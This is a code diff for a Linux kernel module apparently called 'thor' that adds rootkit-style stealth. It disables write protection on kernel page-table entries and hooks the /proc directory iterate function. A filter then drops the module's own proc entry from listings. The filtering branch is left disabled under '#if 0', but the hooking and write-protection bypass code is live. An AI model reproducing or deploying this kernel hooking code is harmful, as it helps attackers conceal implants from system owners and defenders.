@@ -4,6 +4,8 @@
 #include <linux/module.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
+#include <linux/ptrace.h>
+#include <linux/slab.h>
 
 #include "fs/proc/internal.h"
 
@@ -22,10 +24,18 @@ static int procfile_open(struct inode *inode, struct file *file);
 static int procfile_read(struct seq_file *m, void *v);
 static ssize_t procfile_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
 static void procfile_cleanup(void);
+static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
+static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 
 // ------------------------------------------------------------ GLOBALS
 static struct proc_dir_entry *procfile;
 static struct proc_dir_entry *procroot;
+static struct file_operations *proc_fops;
+static int (*orig_proc_iterate)(struct file *, struct dir_context *);
+static struct dir_context *orig_dir_ctx = NULL;
+static struct dir_context thor_dir_ctx = {
+    .actor = thor_proc_filldir,
+};
 static struct file_operations procfile_fops = {
     .owner = THIS_MODULE,
     .open = procfile_open,
@@ -34,6 +44,20 @@ static struct file_operations procfile_fops = {
     .llseek = seq_lseek,
     .release = single_release,
 };
+// ------------------------------------------------------------ HELPERS
+static void set_addr_rw(void *addr)
+{
+    unsigned int level;
+    pte_t *pte = lookup_address((unsigned long) addr, &level);
+    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+}
+
+static void set_addr_ro(void *addr)
+{
+    unsigned int level;
+    pte_t *pte = lookup_address((unsigned long) addr, &level);
+    pte->pte = pte->pte &~_PAGE_RW;
+}
 
 // ------------------------------------------------------------ INIT
 static int __init thor_init(void)
@@ -53,7 +77,6 @@ static int __init procfile_init(void)
         LOG_ERROR("could not create proc entry");
         return -1;
     }
-    procroot = procfile->parent;
 
     return 0;
 }
@@ -64,6 +87,15 @@ static int __init prochidder_init(void)
         LOG_ERROR("procfile not set");
         return -1;
     }
+
+    // insert our modified iterate for /proc
+    procroot = procfile->parent;
+    proc_fops = procroot->proc_fops;
+    orig_proc_iterate = proc_fops->iterate;
+
+    set_addr_rw(proc_fops);
+    proc_fops->iterate = thor_proc_iterate;
+    set_addr_ro(proc_fops);
 
     return 0;
 }
@@ -88,10 +120,35 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
     return count;
 }
 
+
+static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
+{
+#if 0
+    orig_dir_ctx = ctx;
+    thor_dir_ctx.pos = ctx->pos;
+    return orig_proc_iterate(file, &thor_dir_ctx);
+#else
+    return orig_proc_iterate(file, ctx);
+#endif
+}
+
+static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+{
+    if (0 == strcmp(name, THOR_PROCFILE)) return 0;
+    return orig_dir_ctx->actor(buf, name, namelen, offset, ino, d_type);
+}
+
 // ------------------------------------------------------------ CLEANUP
 static void __exit thor_cleanup(void)
 {
     procfile_cleanup();
+
+    if(NULL != proc_fops && NULL != orig_proc_iterate)
+    {
+        set_addr_rw(proc_fops);
+        proc_fops->iterate = orig_proc_iterate;
+        set_addr_ro(proc_fops);
+    }
 
     LOG_INFO("cleanup done");
 }
